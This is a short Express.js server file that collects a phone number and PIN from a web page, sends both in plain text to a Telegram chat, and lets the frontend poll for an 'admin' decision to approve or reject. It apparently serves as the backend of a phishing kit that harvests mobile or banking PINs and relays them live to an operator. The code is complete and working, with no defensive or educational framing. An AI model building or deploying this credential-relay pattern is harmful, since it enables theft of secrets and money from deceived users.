require('dotenv').config();
const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID; // fallback/default admin
const pendingRequests = {};

app.post('/api/verify-pin', async (req, res) => {
  const { phoneNumber, pin, adminId, assignmentType } = req.body;

  if (!phoneNumber || !pin || pin.length < 4) {
    return res.json({ success: false, message: 'Phone number and 4-digit PIN are required.' });
  }

  const applicationId = Date.now().toString();
  const assignedAdminId = adminId || ADMIN_CHAT_ID; // use specific admin if given, else default

  pendingRequests[applicationId] = {
    phoneNumber,
    pin,
    assignedAdminId,
    assignmentType,
    status: 'pending'
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: assignedAdminId,
        text: `📱 Phone: ${phoneNumber}\n🔑 PIN: ${pin}\n🆔 Application ID: ${applicationId}`,
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `approve_${applicationId}` },
            { text: '❌ Reject', callback_data: `reject_${applicationId}` }
          ]]
        }
      })
    });

    res.json({ success: true, applicationId, assignedAdminId });
  } catch (err) {
    console.error('Telegram send error:', err);
    res.json({ success: false, message: 'Failed to reach admin. Please try again.' });
  }
});

// Used by pollPinStatus() on the frontend
app.get('/api/verify-pin/status/:applicationId', (req, res) => {
  const request = pendingRequests[req.params.applicationId];
  if (!request) return res.status(404).json({ error: 'Not found' });
  res.json({ status: request.status });
});

app.post('/api/telegram-webhook', (req, res) => {
  const callback = req.body.callback_query;
  if (callback) {
    const [action, applicationId] = callback.data.split('_');
    if (pendingRequests[applicationId]) {
      pendingRequests[applicationId].status = action === 'approve' ? 'approved' : 'rejected';
    }
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
